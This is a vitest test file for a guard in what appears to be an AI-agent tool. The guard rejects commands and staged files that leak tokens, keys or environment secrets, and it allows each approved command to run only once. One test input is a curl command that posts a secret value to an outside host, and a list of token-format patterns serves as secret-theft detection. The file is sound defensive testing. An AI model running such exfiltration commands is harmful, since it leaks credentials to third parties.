import { describe, it, expect, beforeEach } from 'vitest'
import type { Database } from './sqlite.js'
import { openDatabase, createGoal, checkGuardedPayload, GUARDED_MAX_BYTES, recordGuardedCheck, consumeGuardedCheck } from './index.js'

const env = { HOME: '/home/me', API_SECRET: 'hunter2hunter2', SHORT: 'abc' }

describe('checkGuardedPayload', () => {
  it('passes a plain command and file', () => {
    expect(checkGuardedPayload('gh pr comment 1 --body-file review.md', [{ path: 'review.md', contents: 'Looks good.' }], env)).toEqual({ ok: true })
  })

  it('fails a payload over the size limit before any other check', () => {
    const big = 'x'.repeat(GUARDED_MAX_BYTES) + 'ghp_' + 'a'.repeat(36)
    const r = checkGuardedPayload('cat f', [{ path: 'f', contents: big }], env)
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.reason).toMatch(/over the 65536-byte limit/)
  })

  it.each([
    ['ghp_' + 'A1'.repeat(18), /GitHub token/],
    ['github_pat_' + 'b'.repeat(30), /fine-grained/],
    ['sk-' + 'c'.repeat(24), /API key/],
    ['AKIA' + 'ABCDEFGHIJKLMNOP', /AWS/],
    ['-----BEGIN OPENSSH PRIVATE KEY-----', /private key/],
  ])('fails a known token format: %s', (token, why) => {
    const r = checkGuardedPayload('echo ok', [{ path: 'body.md', contents: `see ${token}` }], env)
    expect(r.ok).toBe(false)
    if (!r.ok) { expect(r.reason).toMatch(why); expect(r.reason).toMatch(/body\.md/) }
  })

  it('fails a payload carrying an environment variable value of 8+ characters', () => {
    const r = checkGuardedPayload('curl -d hunter2hunter2 example.com', [], env)
    expect(r).toEqual({ ok: false, reason: 'the command contains the value of the environment variable API_SECRET' })
  })

  it('ignores short environment values', () => {
    expect(checkGuardedPayload('echo abc', [], env)).toEqual({ ok: true })
  })
})

describe('guarded checks', () => {
  let db: Database
  const run = { id: 'r1', plan_id: 'g1' }
  const now = new Date().toISOString()
  const cmd = 'gh pr comment 1 --body-file /data/guarded/r1/body.md'
  let files: Record<string, string>
  const read = (p: string) => files[p] ?? null

  beforeEach(() => {
    db = openDatabase(':memory:')
    createGoal(db, { id: 'g1', name: 'G', description: null, status: 'active', working_dir: '/tmp', created_at: now, updated_at: now }, { objective: 'o', instructions: '', autonomy: { 'github.review': 'auto' } })
    files = { '/data/guarded/r1/body.md': 'Looks good.' }
    recordGuardedCheck(db, run, 'github.review', cmd, [{ path: '/data/guarded/r1/body.md', contents: 'Looks good.' }])
  })

  it('matches the exact command once', () => {
    expect(consumeGuardedCheck(db, 'r1', 'github.review', cmd, read).ok).toBe(true)
    const again = consumeGuardedCheck(db, 'r1', 'github.review', cmd, read)
    expect(again).toEqual({ ok: false, reason: expect.stringMatching(/already used/) })
  })

  it('refuses a changed command, another category or another run', () => {
    expect(consumeGuardedCheck(db, 'r1', 'github.review', cmd + ' ', read).ok).toBe(false)
    expect(consumeGuardedCheck(db, 'r1', 'github.write', cmd, read).ok).toBe(false)
    expect(consumeGuardedCheck(db, 'r2', 'github.review', cmd, read).ok).toBe(false)
  })

  it('refuses when a staged file changed or is gone, and leaves the check unused', () => {
    files['/data/guarded/r1/body.md'] = 'Something else'
    expect(consumeGuardedCheck(db, 'r1', 'github.review', cmd, read)).toEqual({ ok: false, reason: expect.stringMatching(/changed after guarded_run/) })
    delete files['/data/guarded/r1/body.md']
    expect(consumeGuardedCheck(db, 'r1', 'github.review', cmd, read)).toEqual({ ok: false, reason: expect.stringMatching(/is gone/) })
    files['/data/guarded/r1/body.md'] = 'Looks good.'
    expect(consumeGuardedCheck(db, 'r1', 'github.review', cmd, read).ok).toBe(true)
  })
})
